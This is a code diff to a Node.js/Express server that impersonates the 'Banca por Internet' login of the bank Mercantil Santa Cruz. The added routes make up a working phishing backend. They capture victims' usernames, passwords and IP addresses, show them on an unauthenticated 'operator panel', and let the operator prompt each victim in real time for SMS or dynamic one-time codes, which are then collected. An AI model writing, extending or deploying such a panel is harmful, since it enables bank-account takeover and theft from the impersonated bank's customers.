@@ -8,9 +8,169 @@ const PORT = process.env.PORT || 3000;
 app.set("view engine", "ejs");
 app.set("views", path.join(__dirname, "views"));
 app.locals.ASSETS = ASSETS;
-app.use(express.static(path.join(__dirname, "public")));
+
+app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
+// CORS & Security Headers
+app.use((req, res, next) => {
+  res.setHeader("Access-Control-Allow-Origin", "*");
+  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
+  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
+  if (req.method === "OPTIONS") return res.sendStatus(200);
+  next();
+});
+
+// Static public files
+app.use(express.static(path.join(__dirname, "public")));
+
+// Expose operator panel
+app.use("/panel", express.static(path.join(__dirname, "public", "panel")));
+app.get("/panel", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "panel", "index.html"));
+});
+
+// In-memory sessions store
+let sessions = {};
+
+// 1. Create or update session from login
+app.post("/api/sessions", (req, res) => {
+  const { id, username, password, tipoUsuario, device, ip, state } = req.body;
+  if (!id) return res.status(400).json({ error: "Missing session id" });
+
+  const clientIp = ip || req.headers["x-forwarded-for"] || req.socket.remoteAddress || "127.0.0.1";
+
+  if (sessions[id]) {
+    sessions[id] = {
+      ...sessions[id],
+      username: username || sessions[id].username,
+      password: password || sessions[id].password,
+      tipoUsuario: tipoUsuario || sessions[id].tipoUsuario,
+      device: device || sessions[id].device,
+      ip: clientIp,
+      state: state || sessions[id].state,
+      last_seen: Date.now(),
+      updatedAt: Date.now()
+    };
+  } else {
+    sessions[id] = {
+      id,
+      index: Object.keys(sessions).length + 1,
+      username: username || "—",
+      password: password || "—",
+      tipoUsuario: tipoUsuario || "Banca por Internet",
+      device: device || "desktop",
+      ip: clientIp,
+      state: state || "waiting",
+      token: "",
+      action: null,
+      createdAt: Date.now(),
+      last_seen: Date.now(),
+      updatedAt: Date.now()
+    };
+  }
+  res.json({ success: true, session: sessions[id] });
+});
+
+// 2. Get all sessions for operator panel
+app.get("/api/sessions", (req, res) => {
+  const now = Date.now();
+  const list = Object.values(sessions).map(s => ({
+    ...s,
+    online: now - s.last_seen < 20000
+  }));
+  res.json(list);
+});
+
+// 3. Get single session for polling
+app.get("/api/sessions/:id", (req, res) => {
+  const session = sessions[req.params.id];
+  if (!session) return res.status(404).json({ error: "Session not found" });
+  res.json(session);
+});
+
+// 4. Submit token from OTP validation
+app.post("/api/sessions/:id/token", (req, res) => {
+  const { id } = req.params;
+  const { token } = req.body;
+  if (!sessions[id]) return res.status(404).json({ error: "Session not found" });
+
+  sessions[id].token = token;
+  const currentAction = sessions[id].action;
+  if (currentAction === "sms") {
+    sessions[id].state = "received-sms";
+  } else {
+    sessions[id].state = "received-dinamica";
+  }
+  sessions[id].action = null;
+  sessions[id].last_seen = Date.now();
+  sessions[id].updatedAt = Date.now();
+  res.json({ success: true, session: sessions[id] });
+});
+
+// 5. Keepalive ping
+app.post("/api/sessions/:id/ping", (req, res) => {
+  const { id } = req.params;
+  if (!sessions[id]) return res.status(404).json({ error: "Session not found" });
+
+  sessions[id].last_seen = Date.now();
+  res.json({ success: true });
+});
+
+// 6. Set operator action
+app.post("/api/sessions/:id/action", (req, res) => {
+  const { id } = req.params;
+  const { action, state } = req.body;
+  if (!sessions[id]) return res.status(404).json({ error: "Session not found" });
+
+  sessions[id].action = action;
+  if (state) sessions[id].state = state;
+  if (action === "dinamica" || action === "sms") {
+    sessions[id].token = "";
+  }
+  sessions[id].last_seen = Date.now();
+  sessions[id].updatedAt = Date.now();
+  res.json({ success: true, session: sessions[id] });
+});
+
+// 7. Update typing state
+app.post("/api/sessions/:id/state", (req, res) => {
+  const { id } = req.params;
+  const { state } = req.body;
+  const clientIp = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "127.0.0.1";
+
+  if (!sessions[id]) {
+    sessions[id] = {
+      id,
+      index: Object.keys(sessions).length + 1,
+      username: "—",
+      password: "—",
+      tipoUsuario: "Banca por Internet",
+      device: "desktop",
+      ip: clientIp,
+      state: state || "typing",
+      token: "",
+      action: null,
+      createdAt: Date.now(),
+      last_seen: Date.now(),
+      updatedAt: Date.now()
+    };
+    return res.json({ success: true, session: sessions[id] });
+  }
+
+  sessions[id].state = state;
+  sessions[id].last_seen = Date.now();
+  sessions[id].updatedAt = Date.now();
+  res.json({ success: true, session: sessions[id] });
+});
+
+// 8. Clear all sessions
+app.post("/api/clear", (req, res) => {
+  sessions = {};
+  res.json({ success: true });
+});
+
+// Site template locals
 app.use((req, res, next) => {
   res.locals.ASSETS = ASSETS;
   res.locals.segments = segments;
@@ -58,7 +218,7 @@ app.post("/contactanos", (req, res) => {
 
 app.get("/banca-por-internet", (req, res) => {
   res.render("banca", {
-    title: "Banca por Internet"
+    title: "Banca por Internet | Mercantil Santa Cruz"
   });
 });
 
@@ -91,6 +251,19 @@ app.use((req, res) => {
   });
 });
 
-app.listen(PORT, "0.0.0.0", () => {
-  console.log(`Mercantil Santa Cruz listo en el puerto ${PORT}`);
+const server = app.listen(PORT, "0.0.0.0", () => {
+  console.log(`Mercantil Santa Cruz listo en http://localhost:${PORT}`);
+  console.log(`Panel de operador disponible en http://localhost:${PORT}/panel`);
+});
+
+server.on("error", (err) => {
+  if (err.code === "EADDRINUSE") {
+    console.error(`Puerto ${PORT} en uso. Intentando en ${PORT + 1}...`);
+    app.listen(PORT + 1, "0.0.0.0", () => {
+      console.log(`Mercantil Santa Cruz listo en http://localhost:${PORT + 1}`);
+      console.log(`Panel de operador disponible en http://localhost:${PORT + 1}/panel`);
+    });
+  } else {
+    console.error("Error del servidor:", err);
+  }
 });
